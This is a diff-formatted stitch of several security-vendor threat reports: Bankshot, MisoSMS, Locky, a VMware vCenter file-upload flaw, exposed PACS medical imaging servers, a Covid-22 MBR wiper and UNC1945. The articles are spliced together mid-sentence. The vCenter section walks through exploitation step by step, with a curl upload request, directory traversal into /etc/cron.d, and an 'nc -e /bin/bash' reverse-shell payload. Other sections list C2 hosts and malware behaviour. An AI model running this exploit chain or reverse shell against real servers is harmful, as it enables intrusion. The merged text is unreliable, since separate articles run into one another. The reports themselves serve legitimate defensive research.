@@ -1,0 +1,506 @@
+By Ryan Sherstobitoff on Mar 08, 2018
+This post was prepared with contributions from Asheer Malhotra, Charles Crawford, and Jessica Saavedra-Morales.
+On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations.
+In this analysis, we observed the return of Hidden Cobra’s Bankshot malware implant surfacing in the Turkish financial system.
+Based on the code similarity, the victim’s business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.
+In this new, aggressive campaign we see a return of the Bankshot implant, which last appeared in 2017.
+Bankshot is designed to persist on a victim’s network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.
+Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document.
+The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency.
+The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant.
+the Further investigation into this campaign and analysis of McAfee product telemetry shows that the infection occurred on March 2 and 3.
+The implant’s first target was a major government-controlled financial organization.
+It next appeared in another Turkish government organization involved in finance and trade.
+A further three large financial institutions in Turkey were victims of this attack.
+The implant has so far not surfaced in any other sector or country.
+This campaign suggests the attackers may plan a future heist against these targets by using Bankshot to gather information.
+Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity.
+The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear.
+These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim’s system.
+This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.
+Bankshot was first reported by the Department of Homeland Security on December 13, 2017, and has only recently resurfaced in newly compiled variants.
+The sample we analyzed is 99% similar to the documented Bankshot variants from 2017.
+Bankshot implants hosted on falcancoin.io.
+The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx.
+The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange.
+The author of this document is test-pc.
+It was created February 26 and was submitted from the Netherlands.
+The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.
+We discovered two more documents, written in Korean, that exploit the same vulnerability as Agreement.docx.
+These documents appear to be part of the same campaign and may have been used on different targets.
+These documents also communicated with falcancoin.io to install Bankshot and also contain themes around cryptocurrency security.
+Two Flash files exploit CVE-2018-4878.
+843c17b06a3aee22447f021307909890b68828b9 (February 25) 343ebca579bb888eb8ccb811f9b52280c72e484c (February 25 Malicious documents in the attack.
+Malicious document exploiting CVE-2018-4878.
+The implants are downloaded via a Flash file embedded in the malicious document.
+They are executed when the victim views the document.
+The malicious site falcancoin.io embedded in the Flash file.
+Implant directory contained in the malicious Flash file.
+The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites.
+These URLs can be found hardcoded in the implants’ code.
+Hardcoded control server URLs.
+Analyzing Bankshot
+The sample (a2e966edee45b30bb6bb5c978e55833eec169098) is a Windows DLL that serves as a backdoor and contains a variety of capabilities.
+The malicious DLL is not a service DLL
+because it lacks ServiceMain().
+To mask itself, it can run as a regular library loaded into a legitimate process.
+The malware begins by creating a new thread from the DllMain() function to carry out its malicious activities: New thread created in the malware’s DllMain() function.
+The malware performs the following activities: Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress().
+APIs from the following libraries are loaded at runtime: Kernel32.dll Ws2_32/wsock32.dll Apvapi32.dll Oleaut32.dll Iphlp.dll Urlmon.dll A dynamic API loaded by the malware.
+Based on packet capture analysis of previous implants from 2017, the following strings are used in control server communications:
+Connection: keep-alive Cache-Control: max-age=0 Accept: */* Content-Type: multipart/form-data; boundary= Content-Type: application/octet-stream Accept-Encoding: gzip,deflate,sdch Accept-Language: ko-KR -> Korean Content-Disposition: form-data;name=”board_id” Content-Disposition: form-data;name=”user_id” Content-Disposition: form-data;name=”file1″; filename=”img01_29.jpg” Content-Disposition: form-data;name=”file1″; filename=”my.doc” Content-Disposition: form-data;name=”file1″; filename=”pratice.pdf” Content-Disposition: form-data;name=”file1″; filename=”king.jpg” Content-Disposition: form-data;name=”file1″; filename=”dream.avi” Content-Disposition: form-data;name=”file1″; filename=”hp01.avi” Content-Disposition: form-data;name=”file1″; filename=”star.avi” User Agents
+The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary:
+Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95
+Safari/537.36 Control Server Communications
+The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data, such as: ------FormBoundary<randomly_generated_characters>\r\nContent-Disposition: form-data; name=\"board_id\" 8306 ------FormBoundary<randomly_generated_characters>\r\nContent-Disposition: form-data; name=\"user_id\" *dJU!*JE&!M@UNQ@ ------FormBoundary<randomly_generated_characters>\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"king.jpg\"\r\nContent-Type: application/octet-stream board_id is a four-digit number that may be an identifier for a campaign ID.
+Based on analysis of previous samples, this is a unique identifier.
+user_id is a hardcoded value in the malware binary that is sent to the control server.
+The username appears to be attacker specified and has occurred in 2017 Bankshot samples.
+This links the previous samples with this unique username.
+filename is based on static analysis.
+This looks like a specific beacon to indicate that the malware is ready to receive commands.
+The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands: Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h
+Malware checking to make sure a received command is in the correct range.
+The command index calculator and jump to the appropriate command.
+The command index table and command handler address table.
+Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks: Recursively generate a list of files in a directory and send to the control server Terminate a specific process.FireEye Labs recently found a more advanced variant of Android.
+MisoSMS, the SMS-stealing malware that we uncovered last December — yet another sign of cybercriminals’ growing interest in hijacking mobile devices for surveillance and data theft.
+Like the original version of the malware, the new variant sends copies of users’ text messages to servers in China.
+But the newest rendition adds a few features that make it harder to detect, including a new disguise, encrypted transmissions, and command-and-control (CnC) communications that are handled natively rather than over email.
+FireEye Mobile Threat Prevention customers are already protected from both variants.
+Both variants of MisoSMS use the same names for receivers and services.
+While the old variant masquerades as an Android settings application, the new version presents itself as “Gplay Dsc” to the user.
+The new variant also abandons SMTP email as the transport method.
+It now handles all CnC communication natively in C++, making it harder for an analyst to analyze the malware by disassembling its ARM code.
+The newer version also hard codes specific public DNS servers such as the following: resolver1.opendns.com
+nscache.prserv.com resolver1.qwest.net resolver2.opendns.com google-public-dns-b.google.com google-public-dns-a.google.com mx1.oray.net.cn 183.136.132.176 183.136.132.170
+The new MisoSMS attempts to resolve its CnC domain name(puk[dot]nespigt[dot]iego[dot]net) from one of these DNS servers.
+In this way, MisoSMS stays quiet in sandbox environments, which typically use internal DNS servers and cut off access to outside networks.
+If the malware cannot access the hard-coded DNS servers, it does nothing and is therefore not detected.
+The new MisoSMS also uses a variant of the XTEA encryption algorithm to communicate with its CnC server.
+The request and responses of the CnC server are structured so that the first four bytes of the request and response contain the length of the encrypted blob of data.
+By skipping the first four bytes, we can decrypt the communications using the key embedded in the native binary.
+Figure 1 shows MisoSMS registering a newly infected device with the CnC server.
+The first four bytes in the encrypted payload mark the length of the message.
+The rest of the payload contains information about the infected device.
+[caption id=\"attachment_5080\" align=\"aligncenter\" width=\"621\"] Figure 1 - New Infection Registration[/caption] Figure 2 and Figure 3 show the SMS exfiltration mechanism, as seen in Figure 1, the first four bytes of the encrypted payload contains the length indicator of the payload.
+The intercepted SMS message is sent to the CnC with the Device ID of the already compromised device.
+[caption id=\"attachment_5078\"
+align=\"aligncenter\" width=\"640\"] Figure 2 - Encrypted
+CnC Communication containing stolen SMS[/caption] [caption id=\"attachment_5079\" align=\"aligncenter\" width=\"640\"] Figure 3 - Decrypted CnC Communication containing stolen SMS[/caption]
+The domain name of the CnC is also encrypted and stored as a byte array in the native binary.
+Once the encrypted byte array containing the CnC information is decrypted, the malware checks to see whether the CnC is a domain or an IP address.
+That check is  meaningful.
+Its existence implies the ability to change the CnC information dynamically.
+And that ability, in turn, suggests that MisoSMS uses excerpts of publically available code.
+The CnC server currently serves a Web page that resembles an Android app, as shown in Figure 4.
+[caption id=\"attachment_5081\" align=\"aligncenter\" width=\"349\"] Figure 4 - CnC serving an webpage[/caption]
+The Web page contains a link pointing to “hxxps://www.dropbox.com/s/t47d2nheqbhky64/%EA%B2%BD%20%EC%B0%B0%20%EC%B2%AD[dot]apk,” which is currently not available.
+Like the website, the MisoSMS app itself displays Korean text.
+The newest version of MisoSMS suggests that cyber attackers are increasingly eyeing mobile devices — and the valuable information they store — as targets.
+It also serves as a vivid reminder of how crucial protecting this threat vector is in today’s mobile environment.
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+FireEye Labs is detecting a significant spike in Locky ransomware downloaders due to a pair of concurrent email spam campaigns impacting users in over 50 countries.
+Some of the top affected countries are depicted in Figure 1.
+Figure 1.
+Affected countries As seen in Figure 2, the steep spike starts on March 21, 2016, where Locky is running campaigns that coincide with the new Dridex campaigns that were discussed in the blog, “Stop Scanning My Macro”.
+Figure 2.
+Detection on spam delivered malware Prior to Locky’s emergence in February 2016, Dridex was known to be responsible for a relatively higher volume of email spam campaigns.
+However, as shown in Figure 3, we can see that Locky is catching up with Dridex’s spam activities.
+This is especially true for this week, as we are seeing more Locky-related spam themes than Dridex.
+On top of that, we also are seeing Dridex and Locky running campaigns on the same day, which resulted in an abnormal detection spike.
+Figure 3.
+Dridex versus Locky spam campaign over time Locky Ransomware spam The new Locky spam campaign uses several themes such as “invoice notice”, “attached image”, and “attached document themes”.
+See Figure 4 and Figure 5 for example campaign emails.
+Figure 4.
+Urgent Invoice Campaign Figure 5.
+Other Campaigns The ZIP attachment as depicted in Figure 6 contains a malicious JavaScript downloader that downloads and installs the Locky ransomware.
+Figure 6.
+Zipped Content In Figure 7, it is interesting to see that the recent Locky campaign seems to prefer using a JavaScript-based downloader in comparison to Microsoft Word and Excel macro-based downloaders, which were seen being used in its early days.
+Figure 7.
+Locky Downloader Mechanism The preference for JavaScript downloaders could be due to the ease to transform or obfuscate the script via automation to generate new variants as depicted in Figure 8.
+As a result, the traditional signature-based solution may not keep up with the variants where its behavioral intent is the same.
+At the time of discovery, most of the samples that we see are being detected by only one vendor, according to VirusTotal.
+Figure 8.
+Obfuscated JavaScript code
+Conclusions The volume of Locky ransomware downloaders observed is increasing and it may potentially replace the Dridex downloader as the top spammer.
+One of the latest victims of Locky is Methodist Hospital [1], where the victim was reportedly forced to pay a ransom to retrieve their encrypted data.
+This suggests that the cybercriminals are earning more from ransomware and this drives their aggressive campaigns.
+On top of that, JavaScript downloaders seem to be the preferred medium for delivering its payload as it could be easily obfuscated to create new variants.
+Technical Analysis of a Locky Payload Sample MD5 Sum: 3F118D0B888430AB9F58FC2589207988 (First seen on 2016-02-24 in VirusTotal) Persistence Mechanism
+The malware does not contain a persistence mechanism.
+An external tool or installer is required if the attacker desires persistence.
+The malware contains the ability to install the following registry key for persistence; this functionality is disabled in this variant.
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Locky <path_to_malware
+> File System Artifacts
+The malware encrypts files on the system and creates new files with the encrypted contents in the same directory with the following naming convention: <system identifier><16 random hex
+digits>.locky The <system identifier> value is the ASCII hexadecimal representation of the first eight bytes of the MD5 hash of the GUID of the system volume.
+The malware drops a ransom note provided by the C2 server in all directories with encrypted files and on the desktop of the current user: _Locky_recover_instructions.txt
+The malware drops an image on the desktop of the current user: _
+Locky_recover_instructions.bmp
+Registry Artifacts
+The malware creates the registry key HKCU\\Software\\Locky.
+id is set to a unique identifier generated for the compromised system.
+pubkey is set to a binary buffer that contains a public RSA key.
+paytext is set to a binary buffer containing the recovery instructions.
+completed is set to 1.
+The malware changes the desktop background to a bitmap containing the ransom instructions.
+HKCU\\Control Panel\\Desktop\\Wallpaper is set to: %CSIDL_DESKTOPDIRECTORY%\\_Locky_recover_instructions.bmp Network-Based Signatures Command and Control (CnC)
+The malware communicates with the following hard-coded hosts using HTTP over TCP port 80.
+The malware also uses a domain name generation algorithm as described below.
+188.138.88.184 31.41.47.37 5.34.183.136 91.121.97.170 Beacon Packet The malware beacon builds a HTTP POST request to /main.php as shown in Figure 9.
+The POST data is encoded using a custom algorithm.
+Figure 9.
+HTTP POST request polling packet (general packet structure)
+Domain Generation Algorithm (DGA)
+This sample contains a domain name generation algorithm that is based on the current month, day and year.
+There are eight possible domains per day and the domains change on the first of the month and on even numbered days.
+Figure 10 contains Python code to generate the eight possible domain names for the current date.
+Figure 10.
+Locky Domain Generation Algorithm [1] http://arstechnica.com/security/2016/03/kentucky-hospital-hit-by-ransomware-attack/ Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+VMware vCenter server is a centralised management utility used for managing multiple ESXi hosts, virtual machines and all their dependent components.
+An arbitrary file upload vulnerability has recently been discovered in the Analytics service of VMware vCen t er Server.
+V M ware has confirmed that this vulnerability is being actively exploited in the wild and CVE-2021-2205 has been assigned to it.
+More details about this vulnerability and various affected versions can be found at NVD .
+This blog examines how th is vulnera bility can be exploited in the unpatched vCenter Server 7.0.
+Vulnerability Details In our lab, we have locally setup vCenter 7.0 build 17920168 to test the attack scenario.
+The Customer Experience Improvement Program (CEIP) enables VMware to collect user usage statistics to improve their product and provide better user support.
+Some of these statistics are: Configuration Data Feature Usage Data Performance Data Product Log Data Use rs can opt in or out of CEIP from vCenter’s vSphere Client: VMware CEIP First, we determined how this telemetry data is collected and stored by VMware server.
+By taking a look at its various configurations, Juniper Threat Labs found analytics proxy.conf that defines several API calls specific to telemetry, as shown below: /analytics/telemetry/ph/api/hyper/send /analytics/telemetry/ph/api/level VMware analytics API configuration We also observe d that l ocal and 15080 is configured which should indicate hostname and port used for these APIs.
+We can see that a service called vmware -analytics is running over tcp port 15080 : vmware-analytics running over port 15080 The API in use is confirmed when we perform network capture on port 15080.
+POST request is sent to “ /analytics/telemetry/ph/api/hyper/send” .
+The query parameters “ _c” and “ _i” defines the filename for the log collected in JSON format wherein the filename is in following format: _c< value of parameter _c
+>_
+i< value of parameter _
+i >.json
+Result of tcpdump on port 15080 Looking at the logs, we can see that the file is created under folder “ / var/log/ vmware /analytics/pro d” , with the body of POST request appended to it: File created An arbitrary file upload vulnerability exists in vulnerable versions of VMware vCenter.
+Any user with web access to vCenter server can make use of the analytics endpoints to create arbitrary files at any directory of their choice.
+A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution.
+As an example, following curl request can create a file “ _c_itest.json” with content “ Example” in location “ /var/log/vmware/analytics/prod/” : curl -kv “https://<vCenter-Server-ip>/analytics/telemetry/ph/api/hyper/send?_c&_i=test”
+-d “Example” -H “Content-Type: application/json” S teps to recreate attack scenario Create a directory with a test file.
+Testing creation of directory and file File 1234.json created As we can see filename “ 1234.json” is created inside folder “ _ c_i” .
+Create a file in “/ tmp” to check for directory traversal Testing directory traversal Folder “ _ c_i” that was created in previous step is important to perform directory traversal , because the process will look for “_ c_i /.. /.. /.. /.. /.. /.. / tmp /” folder before writing the file “ test2.json” at destination location:
+File created in /tmp
+by directory traversal R emote C ode E xecution To achieve remote code execution and obtain a reverse shell, the following steps can be taken: On the victim’s server, create a cron job at “ /etc/cron.d/” using directory traversal.
+Provide the appropriate payload to attain reverse shell as body of request.
+On attacker machine, use nc to listen on port where we expect to get reverse shell from vCenter server.
+Let us first creat e a c ro n job file at “ / etc / cron.d /” to run as file owner and provide reverse shell.
+Here the reverse shell payload used is: ***** root nc –e /bin/bash 192.168.1.2 4444 This payload when written to file reverse .json at “ / etc / cron.d /” would run the nc –e /bin/bash 192.168.1.2 4444 command every minute.
+Creating cron job to obtain reverse shell cron job created at /etc/cron.d
+Once the file is created as expected, we would receive a reverse shell from vCenter server at port 4444 as seen below: Reverse shell obtained from vCenter server Remediation and Conclusion Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability using the signature : HTTP:
+CTS:
+VCNTR-ANALYTCS-AFU
+The signature is released as part of export number 3422 and is part of recommended template.
+At the same time, all customers are recommended to update to latest stable version of vCenter as per the advisory released by VMware.
+
+
+By Christiaan Beek on Mar 11, 2018 The nonperishable nature of medical data makes an irresistible target for cybercriminals.
+The art of hacking requires significant time and effort, encouraging experienced cybercriminals to plot their attacks based on the return they will see from their investment.
+Those who have successfully gained access to medical data have been well rewarded for their efforts.
+One seller stated in an interview that “someone wanted to buy all the … records specifically,” claiming that the effort had netted US$100,000.
+While at a doctor’s appointment with my wife watching a beautiful 4D ultrasound of our unborn child, I noticed the words “saving data to image” flash on the screen.
+Although this phrase would not catch the attention of most people, given my research on how cybercriminals are targeting the health care industry , I quickly began to wonder why an ultrasound of our child would not instead save to a file.
+Intrigued, I decided to dig into the world of medical imaging and its possible security risks.
+The results were disturbing; ultimately, we were able to combine attack vectors to reconstruct body parts from the images and make a three-dimensional model.
+PACS Most hospitals or medical research facilities use PACS, for picture archiving and communication system, so that images such as ultrasounds, mammograms, MRIs, etc. can be accessed from the various systems within their facility, or through the cloud.
+A PACS setup contains multiple components, including a workstation, imaging device, acquisition gateway, PACS controller, database, and archiving—as illustrated in the following graphic: The basic elements of PACS infrastructure.
+The imaging device creates a picture, such as an ultrasound or MRI, which is uploaded to an acquisition gateway.
+Because much of the imaging equipment in use by medical facilities does not align with security best practices, acquisition gateways are placed in the network to enable the digital exchange of the images.
+The acquisition gateway also often acts as the server connecting to the hospital’s information system (using the HL7 protocol) to enrich images with patient data.
+The PACS controller is the central unit coordinating all traffic among the different components.
+The final component in the PACS infrastructure is the database and archiving system.
+The system ensures that all images are correctly stored and labeled for either short- or long-term storage.
+Larger implementations might have multiple imaging devices and acquisition gateways in various locations, connected over the Internet.
+During our investigation, we noticed many small medical practices around the world using free, open-source PACS software, which was not always securely implemented.
+To determine how many PACS servers are connected depends on on how you search using Shodan, a search engine for finding specific types of computers connected to the Internet.
+Some servers connect over TCP 104; others use HTTP TCP 80 or HTTPS TCP 443.
+A quick search revealed more than 1,100 PACS directly connected to the Internet, not behind a recommended layer of network security measures or virtual private networks (VPNs).
+PACS systems connected to the Internet.
+Darker colors represent more systems.
+Our eyebrows began to rise very early in our research, as we came across “IE 6 support only” messages or ActiveX controls and old Java support; many of these products are vulnerable to a plethora of exploits.
+For example, one of the PACS generated an error page when we changed one parameter.
+This is a very basic common way of testing if the application developers did proper input sanitation check to prevent attackers inserting code or generating failures that could reveal data about the application and can give clues to compromise the system.
+A stack-trace error.
+The stack-trace dump revealed the use of Apache Tomcat Version 7.0.13, which has more than 40 vulnerabilities.
+When communicating with the DICOM (digital imaging and communications in medicine) port, TCP 104, it is possible to grab the banner of a server and get a response.
+As we queried, we recorded different responses.
+Let’s look at one: \\x02\\x00\\x00\\x00\\x00\\xbe\\x00\\x01\\x00\\x00ANY-SCP         FINDSCU         \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x151.2.840.10008.3.1.1.1!\\x00\\x00\\x1b\\x01\\x00\\x00\\x00@\\x00\\x00\\x131.2.840.10008.1.2.1P\\x00\\x00>Q\\x00\\x00\\x04\\x00\\x00@\\x00R\\x00\\x00\"1.2.826.0.1.3680043.2.135.1066.101U\\x00\\x00\\x0c1.4.16/WIN32
+The FINDSCU string refers to the findscu tool, which can be used to query a PACS system.
+The DICOM standard defines three data models for the query/retrieve service.
+Each data model has been assigned with one unique ID for the C-FIND, one for the C-MOVE, and one for C-GET; so all together there are nine unique IDs, three for each model.
+In the preceding banner, we retrieved two of those IDs:
+2.840.10008.1.2.1: A transfer unique ID that defines the value “Explicit VR Little Endian” for data transfer 2.826.0.1.3680043.2.135.1066.101:
+A value referring to the implementation class Another value in the banner, “1.4.16/WIN32,” refers to the implementation version.
+In the context of the medical servers, this refers to the version of XAMPP, aka Apache with MariaDB, PHP, and Perl.
+This server was running Apache 2.4.9, which is publicly known to contain nine vulnerabilities.
+In other cases, there was no need to search for vulnerabilities.
+The management interface was wide open and could be accessed without credentials.
+What does this mean?
+It is possible to access the images.
+Vulnerabilities In addition to expensive commercial PACS systems, open-source or small-fee PACS are available for small health care institutions or practices.
+As we investigated these systems, we found that our fears were well founded.
+One web server/client setup used the defaults “admin/password” as credentials without enforcing a change when the server is started for the first time.
+We found more problems: Unencrypted traffic between client and server Click jacking Cross-site scripting (reflected) Cross-site scripting stored as cross-site request forgery Document object model–based link manipulation Remote creation of admin accounts Disclosure of information Many of these are ranked on the list of OWASP Top 10 Most Critical Web Application Security Risks list, which highlights severe flaws that should be addressed in any product delivered to a customer.
+We have reported the vulnerabilities we discovered to these vendors following our responsible disclosure process.
+They cooperated with us in investigating the vulnerabilities and taking appropriate actions to fix the issues.
+But why should we spend so much time and effort in researching vulnerabilities when there are many other ways to retrieve medical images from the Internet?
+Medical Image Formats The medical world uses several image formats for different purposes.
+Each format has different requirements and works with different equipment, protocols, etc.
+A few format examples: NifTi Neuroimaging Informatics Technology Initiative Dicom Digital Imaging and Communications in Medicine MINC Medical Imaging NetCDF
+NRRD
+Nearly Raw Raster Data Searching open directories and FTP servers while using several search engines, we gathered thousands of images—some of them complete MRI scans, mostly in DICOM format.
+One example: An open directory of images.
+The DICOM format originated in the 1980s, before cybersecurity was a key component.
+The standard format contains a detailed list of tags such as patient name, station name, hospital, etc.
+All are included as metadata with the image.
+Opening an image with a text editor presents the following screen:
+An example of the DICOM file format.
+The file begins with the prefix DICM, an indicator that we are dealing with a DICOM file.
+  Other (now obscured) strings in this example include the hospital’s name, city, patient name, and more.
+The Health Insurance Portability and Accountability Act requires a secure medical imaging workflow, which includes the removal or anonymizing of metadata in DICOM files.FortiGuard Labs Threat Research Report Affected platforms : Microsoft Windows Impacted parties : Windows Users Impact : Unable to boot the machine Severity level : Medium Even now, almost two years after the COVID-19 pandemic started, there is no sign that cybercriminals will stop taking advantage of the situation as an attack vector.
+This time, however, this attacker uses a COVID pandemic that has not yet happened as bait.
+FortiGuard Labs recently discovered a new malware posing as a mysterious COVID22 installer.
+While containing many of the features of \"joke\" malware, it is also destructive, causing infected machines to fail to boot.
+Because it has no features for encrypting data demanding a ransom to undo the damage it inflicts, it is instead a new destructive malware variant designed to render affected systems inoperable.
+This blog explains how this malware works.
+Covid-22 in Action The malware file is named Covid22.
+For those unfamiliar with the naming scheme, COVID-19 is a short form of Co rona v irus d isease, and 19 represents the year the outbreak was first identified.
+The file name Covid22 plays off the current Coronavirus disease but applies that same image of fear and destruction to computers, potentially creating a cyber-pandemic in 2022.
+While we don't know how exactly the malware was distributed, the malware author has tried to weaponize fear as bait to lure victims into opening the file.
+While the malware itself is not sophisticated, it does take several actions designed to put fear into the victim before inducing true panic.
+But before that, when first manually running the file, it asks whether the potential victim wants to install Covid-22 on their machine, as if it were an application.
+Once the victim proceeds with the installation, the malware drops several malicious files before forcefully rebooting the machine.
+Dropped files have file names that are simple and self-described for their actions.
+They are listed below in sequence of execution.
+Covid22Server.exe executes the commands in the dropped script.txt lol.vbs creates an endless loop of a MessageBox with \"Your PC has been infected by Covid-22 Corona Virus!
+Enjoy the death of your pc!\" speakwh.vbs uses the computer's speaker to say \"coronavirus\" in a loop CoronaPopup.exe displays a pop-up with the title \"Covid-22 has infected your pc!\" and an image of the actual coronavirus ClutterScreen.exe clutters the screen by constantly moving blocks of pixels x.vbs displays the pop-up message, \"Corona Virus!\" 50 times noescapes.vbs displays the pop-up message \"THERE IS NO ESCAPE\"
+10 times icons.exe fills the screen with red Xs final.vbs displays a pop-up message \"Bye!\" These are the classic actions of joke programs usually intended to annoy or make fun of users.
+But the next activity is not laughable at all.
+The malware drops and executes the malicious WipeMBR.exe wiper malware that destroys the Master Boot Record (MBR) by overwriting its first 512 bytes with zeros.
+ 
+The malware then forces a machine reboot after displaying the following pop-up message: Because MBR has information about the partitions of the hard drive and acts as a loader for the operating system (OS), the compromised machine will not be able to load the OS upon reboot.
+The good news for the users is that the malware does not destroy nor steal any files on the compromised device, meaning the victim can still recover user files from the hard drive.
+The malware also does not demand ransom.
+While the result is almost identical to another MBR wiper that Sonicwall posted a blog about in April 2020, our analysis did not show any resemblance in their wiper codes.
+This newer variant simply overwrites the MBR with zeroes.
+How to Repair a Damaged MBR Fixing an MBR is relatively easy in modern Windows.
+After the affected machine reboots (sometimes it requires a few reboots), the system enters automatic repair mode.
+First, choose Advanced Options, Troubleshoot.
+Another Advanced Option should then let you use the Command Prompt.
+From the Command Prompt, type and run \"bootrec.exe /fixmbr\".
+An alternative and more straightforward option would be to choose Startup Repair on the screen to run the Command Prompt.
+The downside of selecting Startup Repair is that it will take longer to complete the job.
+If the automatic repair mode does not kick in for some reason, you'll need to boot the system off a recovery disk or drive.
+Note that you'll need to change your BIOS settings to ensure the system boots from the recovery media first, or else the system will try to boot using the overwritten MBR leading to a boot error.
+Once the system boots from recovery media, you should be able to choose to run the command prompt, whereby the user can run the command \"bootrec.exe /fixmbr\".
+It is also vital to remind system administrators of the importance of backing up your data on external storage in case any of your files are ever damaged, encrypted, or destroyed.
+You will also want to create recovery media beforehand, or else you will need to use a working machine, which can be difficult for home users after the damage is done.
+Conclusion on COVID-22 Brings Disaster to MBR What looks to be a mere joke program is designed to bring destruction to impacted systems.
+This time, luck was on the victim's side as the malware did not touch any user data, but the user may not be so lucky next time.
+Imagine if the files on the compromised machine had been encrypted or destroyed and could not be recovered.
+Always be mindful of executing unknown files received from the internet.
+Fortinet Protections Fortinet customers are already protected from this malware by the FortiGuard Labs AntiVirus Service as used by FortiGate , FortiClient and FortiMail , and by FortiEDR as follows: W32/Ursu.558C!tr Malicious_Behavior.
+SB VBS/BadJoke.8A6B!tr VBS/BadJoke.7182!tr VBS/BadJoke.84AB!tr VBS/BadJoke.0C12!tr VBS/BadJoke.
+DF52!tr W32/BadJoke.
+DCAB!tr FortiEDR detects the downloaded executable file as malicious based on its behavior.
+IOCs Sample SHA-256: [Covid22.exe] 79f3b39797f0e85d9e537397a6f8966bc288d1b83ae1c313c825fbd17698879e [ClutterScreen.exe] 726DC8D52C9CF794412941BFBD27AF8F6FA27E72154A63F5C81A42BA40BD972D [CoronaPopup.exe] 80C9F65617386940153CC4D42E1097DEB79B4F9C98C67E6025BDC1CA03AD8FB7 [icons.exe] 496CABBD18530780A3CB75340BDDD7F74A71E84C83DF4D185CFC6EC71D14C41E [WipeMBR.exe] 5FC9080177A096DE2B717F2F2196867B6966900E129E5BC4E412D5DCA7ED9E60 [final.vbs] EA2EF4196586BF851D4DC422A04D51AD2CB552BF5AAE2DF361D1ED2D4842B4BA [lol.vbs] C88D3022B25EF86CD19CE99815AD26A1F9A201F69974577DA93E08328E047410 [noescapez.vbs] 3D519FC10BC2B6CAA5A27069DA55B1614CC97C1DFD4BCDC1DD7F36E686D913F1 [x.vbs] E22F004CF9E7C4C7B52BDA59DB2B57816992CB01FDBEF6675760FDD7BCD29728 [speakwh.vbs] 4624876389F6DDFB111FBBF3473D7C6B5555ED8A0F31C37E822A6FFEF5E27DE0 [Covid22Server.exe] 0C6DFAA12A98FB17058B79D283E96A3E34549D0AD2BE58F505AC8ABDE858D8A6 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio .
+Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program .
+Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio.
+
+
+Through Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of “UNC” groups).
+UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection.
+UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations.
+Mandiant discovered and reported to Oracle CVE-2020-14871 , which was addressed in Oracle's October 2020 Critical Patch Update .
+Mandiant recommends staying current on all current patch updates to ensure a high security posture.
+We will discuss this vulnerability in greater detail in a follow up blog post.
+UNC1945 Attack Lifecycle
+The threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems.
+They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim.
+Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics.
+Initial Compromise In late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise.
+The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity.
+Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure.
+This indicates a dwell time of approximately 519 days based on recovered artifacts.
+Although we were unable to determine how the late-2018 initial access was accomplished, we did observe successful UNC1945
+SSH connections directly to the victim Solaris 10 server, since the SSH service was exposed directly to the internet at the time.
+In mid-2020, we observed UNC1945
+deploy
